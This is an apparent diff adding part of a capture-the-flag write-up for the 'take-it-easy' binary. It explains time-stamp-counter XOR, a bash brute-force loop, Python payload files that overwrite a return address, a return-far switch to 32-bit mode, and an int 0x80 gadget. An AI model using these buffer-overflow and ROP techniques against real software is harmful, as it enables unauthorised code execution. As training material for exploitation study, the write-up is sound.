@@ -92,3 +92,113 @@ Loads the current value of the processor's time-stamp counter into the EDX:EAX r
 
 ![x86_64 registers](https://askcodez.com/images2/155807970253616.png)
 
+[XOR](https://www.loginradius.com/blog/engineering/how-does-bitwise-xor-work/#:~:text=XOR%20is%20a%20bitwise%20operator,X)
+
+![XOR](https://i.stack.imgur.com/qncwi.png)
+
+Let's run the debugger and see if we can understand what's going on.
+
+*I am going to provide an input of "AAAAAAAA".*
+
+![gdb take-it-easy](https://pouch.jumpshare.com/preview/xZkkhLGGgCjy_l4-s9YEWNqvAuxNqR8NWdIN0Mgk9h6r-wn3395rj10n486AkehIYwo3AGyPdvSQKNUULLGFqzJprjKJn4snkOQIlHyX-Do)
+
+As you can out input got modified using the xor operation with the $al register wish is read from the time stamp counter. We have no control over the time stamp counter, but knowing the nature of CPU's the time stamp counter is geting incremented each second with an insane speed. 
+
+The second read syscall allow us to store the directly into the stack. Knowing that all we have to do is write the next instruction address to the stack and return far will pop it giving us controll. But to write our adress to the stack we need to overwrite the value pushed before, thus the program quit as it checks if the stack got tampred with.
+
+```
+   0x400204:	xor    r11,QWORD PTR [rbx]
+   0x400207:	jne    0x400214
+```
+
+As said before the time stamp counter will be modified every time we execute the binary. We can brute force the time stamp counter by executing the binary in an infinite loop until one time the sanitization output will be the same as a value we set into the stack thus the check will pass allowing us to write out own address to the stack.
+
+```
+#!/bin/bash
+while [ 1 ]
+do
+  echo "---------- starting ------------"
+  ./take-it-easy < inputs > /dev/null # execute the binary and redirect stdout to /dev/null so the stdout won't be fludded
+  if [ $? -eq 139 ] # check if the binary triggred a SEGV signal
+  then
+    break
+  fi
+  echo "---------- end ----------------"
+done
+```
+
+*I am going to provide an input of "AAAAAAAAVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV".*
+
+![./exploit.sh](https://pouch.jumpshare.com/preview/7ve7SjqX_uPWYeujlAKeB3wbwPIqfKjQ2C9887EQyctySB8GCtLDMKzYH8nSNiNvOv0AQfWUmJzbl37Sgn2OTxA1jQB_zmxltR5bgJ1-nls)
+
+The first buffer check is bypassed. Know let's inject an address to the stack and see if the can get controll of instruction pointer after the return far call.
+
+*I am going to stack to the address of the write checkser address 0x4001a9. We are expecting to see checkser output two times*
+
+```
+fo = open("payload", "wb")
+
+payload = b'A'*8 # the first input
+
+payload += b'X'*40 # 0x20 the the stack get added with + 8 Bytes of the poped buffer
+
+payload += b"\xa9\x01\x40\x00\x00\x00\x00\x00" # the address is inverted because of little endianness
+
+fo.write(payload)
+
+fo.close()
+```
+
+![./exploit.sh](https://pouch.jumpshare.com/preview/8c0RpMeHe5QjTQDLpHu9PncHxWIbsc4C4D9IzfH62G73FBk-rICMjSIjL4wKrWguiq5rWBkcjZp8NeZyfgmcfDJprjKJn4snkOQIlHyX-Do)
+
+**No double checkser!? what's going on?**
+
+We overlook something. return far does more than pop the instruction address from the stack, it also pop another byte to set the code segment register setting it with a value of 0x23. After the return far the code now is running on 32 bit mode. We can test that by loocking for 32 bit instruction and try to execute them.
+
+```
+   0x400214:	mov    rax,0x3c
+```
+
+
+After using a tool called ropper that look for gadgets in the binary, i found a gadget that call a system call. *int 0x80*
+
+![ropper](https://pouch.jumpshare.com/preview/dYhIS75pQl2ijWxcym8Ky8KWzAQ77Skl22UrL8ArM7s00HL9VVjcNFuBG2wjmOK9wQbIzcOpD1Z6nKpdFClmKjJprjKJn4snkOQIlHyX-Do)
+
+![gdb](https://pouch.jumpshare.com/preview/e6y-U3rpzjmLBjYdP8_ZcgQ1UpF6nJdfbWn2RX_qg8JUmNZBZ1x1-Hmulw2YiG1F8xPQiU4VEiHwy8nwRvV6zTJprjKJn4snkOQIlHyX-Do)
+
+We can also controll the eax register because it was never reset after the last read syscall. Wish mean that the eax register will be set by the lenght of out last input. But it will be limited because we can't input a buffer less than 33 Byte plus the address of the gadget and the max is 256 Bytes.
+
+```
+   0x4001ca:	xor    rax,rax
+   0x4001cd:	xor    rdi,rdi
+   0x4001d0:	mov    rsi,rsp
+   0x4001d3:	mov    rdx,0x100
+   0x4001da:	syscall
+```
+
+[x86 syscall table](https://x86.syscall.sh/)
+
+I am going to use olduname to test and run the binary using the debugger to examine the registers.
+***For debugging i bypass the buffer check by setting rbx to the value of r11, set *((unsigned long *) 0x6000400)=$r11***
+
+```
+fo = open("payload", "wb")
+
+payload = b'A'*8
+
+payload += b'X'*40
+
+payload += b"\x37\x01\x40\x00\x00\x00\x00\x00"
+
+payload += b'A'*61
+
+fo.write(payload)
+
+fo.close()
+```
+
+![gdb](https://pouch.jumpshare.com/preview/AsHoOU5CT2iZHkvVBfqYQNFqH6CvdobkJByIPqsCOUnDXw942AAj4hVveVsUk2l-alTpIrR-BYGnczTHh_-m5BA1jQB_zmxltR5bgJ1-nls)
+
+We can see that olduname got executed succesfully, and also can see that the esp point to an invalid address because of the switch to 32bit mode.
+
+
